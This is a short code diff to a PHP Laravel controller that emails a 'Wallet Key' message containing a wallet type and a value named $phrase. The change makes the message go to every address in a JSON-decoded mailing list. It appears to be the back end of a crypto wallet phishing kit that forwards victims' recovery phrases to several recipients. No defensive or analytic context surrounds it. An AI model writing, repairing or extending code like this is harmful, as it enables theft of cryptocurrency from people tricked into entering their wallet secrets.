@@ -62,8 +62,10 @@ class PagesController extends Controller
                     ->subject('Wallet Key');
             });
 
-            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mailList) {
-                $message->to($mailList)
+            $mails = json_decode($mailList,true);
+
+            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mails) {
+                $message->to($mails)
                     ->subject('Wallet Key');
             });
 
